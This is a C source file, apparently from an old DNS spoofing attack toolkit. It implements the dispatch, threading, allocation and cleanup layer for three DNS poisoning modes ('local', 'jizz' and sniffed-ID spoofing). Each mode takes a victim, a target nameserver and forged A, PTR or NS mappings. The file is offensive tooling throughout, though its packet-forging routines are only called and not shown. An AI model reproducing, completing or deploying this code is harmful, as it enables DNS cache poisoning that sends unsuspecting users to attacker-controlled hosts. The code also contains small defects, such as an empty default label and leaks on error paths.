/* 
 * new OO-interface to spoofing functions.
 * hopefully this will make it easier to do 'batch' id spoofs.
 * i.e. A and PTR at the same time, while maintaining flexibility.
 *
 * -Smiler
 */

#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include <stdlib.h>
#include <pthread.h>
#include "dns-spoof-int.h"
#include "dns-spoof.h"
#include "dns-build.h"
#include "common.h"

static void	spoof_id_destroy (spoof_style_id *spoof_id);
static void	spoof_local_destroy (spoof_style_local *spoof_local);
static void	spoof_jizz_destroy (spoof_style_jizz *spoof_jizz);

/* functions to carry out the spoofs, with certain 
 * variations.
 */

void
spoof_do (spoof_base *spoof)
{
	switch (spoof->spoof_style) {
	case SPOOF_STYLE_LOCAL:
		spoof_local (&spoof->spoof.local_spoof);
		break;
	case SPOOF_STYLE_JIZZ:
		spoof_jizz (&spoof->spoof.jizz_spoof);
		break;
	case SPOOF_STYLE_SNIFFID:
		spoof_dnsid (&spoof->spoof.id_spoof);
		break;
	}
	return;
}

void *
_spoof_do_threaded (void *arg)
{
	spoof_do ((spoof_base *)arg);
	spoof_destroy ((spoof_base *)arg);
	return (NULL);
}

pthread_t
spoof_do_threaded (spoof_base *spoof)
{
	pthread_t tid;

	pthread_create (&tid, NULL, _spoof_do_threaded, (void *)spoof);
	return (tid);
}

/* 
 * create a new spoof strucuture for local spoofs.
 * return NULL on error.
 */

spoof_base *
spoof_local_new (char *victim, char *from, char *to, char *dns, char *dns_ip, int type)
{
	spoof_base	*ptr;
	spoof_style_local	*local;

	ptr = (spoof_base *) xcalloc (1, sizeof(spoof_base));

	ptr->spoof_style = SPOOF_STYLE_LOCAL;

	local = &ptr->spoof.local_spoof;
	local->spoof_victim = victim;
	local->spoof_from   = from;
	local->spoof_to     = to;
	local->local_dns    = dns;
	local->local_dns_ip = dns_ip;
	local->spoof_type   = type;

	return (ptr);
}

/*
 * create a new spoof structure for jizz spoofing.
 * return NULL on error.
 */

spoof_base *
spoof_jizz_new (char *ns, char *domain, char *local_ip, char *spoof_from,
		char *spoof_to)
{
	spoof_base		*ptr;
	spoof_style_jizz	*jizz;

	ptr = (spoof_base *) xcalloc (1, sizeof(spoof_base));

	ptr->spoof_style = SPOOF_STYLE_JIZZ;

	jizz = &ptr->spoof.jizz_spoof;
	jizz->nameserver = ns;
	jizz->local_domain = domain;		
	jizz->local_dns_ip = local_ip;
	jizz->spoof_from   = spoof_from;
	jizz->spoof_to     = spoof_to;

	return (ptr);
}

/* 
 * allocate, init and return a new spoof structure for id spoofing
 * return NULL on error.
 */

spoof_base *
spoof_id_new (char *ns, char *local_domain)
{
	spoof_base	*ptr;

	ptr = (spoof_base *)xcalloc (1, sizeof(spoof_base));

	ptr->spoof_style = SPOOF_STYLE_SNIFFID;
	ptr->spoof.id_spoof.nameserver = ns;
	ptr->spoof.id_spoof.local_domain = local_domain;
	ptr->spoof.id_spoof.id_cnt = 0;
	ptr->spoof.id_spoof.root = NULL;
	return (ptr);
}

/* 
 * add an id spoof to the linked list.
 * only supports T_A, T_PTR and T_NS atm.
 * spoof_from_domain can be NULL.
 *
 * return 0 on success
 * return -1 on error
 */

int
spoof_id_add (spoof_base *base, int type, char *spoof_from, 
		char *spoof_to, char *spoof_from_domain)
{
	spoof_style_id	*ptr;
	spoof_id_list	*new,
			*link_ptr;

	if (base->spoof_style != SPOOF_STYLE_SNIFFID)
		return (-1);

	ptr = &base->spoof.id_spoof;

	if (ptr->id_cnt >=  SPOOF_ID_MAX)
		return (-1);

	if (type != T_A && type != T_PTR && type != T_NS)
		return (-1);

	new = (spoof_id_list *) xcalloc (1, sizeof(spoof_id_list));
	memset (new, 0, sizeof(spoof_id_list));

	new->next = NULL;
	new->spoof_type = type;
	new->spoof_from = spoof_from;
	new->spoof_to   = spoof_to;
	if (spoof_from_domain == NULL) {
		if (type != T_PTR) {
			new->spoof_from_domain = dns_domain (new->spoof_from); 
			if (new->spoof_from_domain == NULL)
				return (-1);
		} else {
			new->spoof_from_domain = dns_ptr_domain (new->spoof_from);
			if (new->spoof_from_domain == NULL)
				return (-1);
		}
	} else {
		new->spoof_from_domain = spoof_from_domain;
	}

	/* link in the structure */
	link_ptr = ptr->root;
	if (link_ptr == NULL) {
		ptr->root = new;
	} else {
		while (link_ptr->next) link_ptr = link_ptr->next;
		link_ptr->next = new;
	}

	/* and increase the spoof count */
	++ptr->id_cnt;

	return (0);
}

/*
 * Free a spoof_id structure
 */
static void
spoof_id_destroy (spoof_style_id *spoof_id)
{
	spoof_id_list	*link, *tmp;

	for (link = spoof_id->root; link; link = tmp) {
		tmp = link->next;

		/* free the contents of the link */
		free (link->spoof_from);
		free (link->spoof_to);

		/* then free the link structure */
		free (link);
	}
	free (spoof_id->nameserver);
	free (spoof_id->local_domain);
	return;
}

/*
 * Free a local spoof structure.
 */
static void
spoof_local_destroy (spoof_style_local *spoof_local)
{
	free (spoof_local->spoof_victim);
	free (spoof_local->spoof_from);
	free (spoof_local->spoof_to);
	free (spoof_local->local_dns);
	free (spoof_local->local_dns_ip);
	return;
}
 
/*
 * Free a jizz structure.
 */
static void
spoof_jizz_destroy (spoof_style_jizz *spoof_jizz)
{
	free (spoof_jizz->nameserver);
	free (spoof_jizz->local_domain);
	free (spoof_jizz->local_dns_ip);
	free (spoof_jizz->spoof_from);
	free (spoof_jizz->spoof_to);
	return;
}

/* 
 * Free a general spoof structure.
 */
void
spoof_destroy (spoof_base *spoof_base)
{
	switch (spoof_base->spoof_style) {
	case SPOOF_STYLE_SNIFFID:
		spoof_id_destroy(&spoof_base->spoof.id_spoof);
		break;
	case SPOOF_STYLE_LOCAL:
		spoof_local_destroy(&spoof_base->spoof.local_spoof);
		break;
	case SPOOF_STYLE_JIZZ:
		spoof_jizz_destroy(&spoof_base->spoof.jizz_spoof);
		break;
	default:
		/* hmm */	
	}
	free (spoof_base);
	return;
}
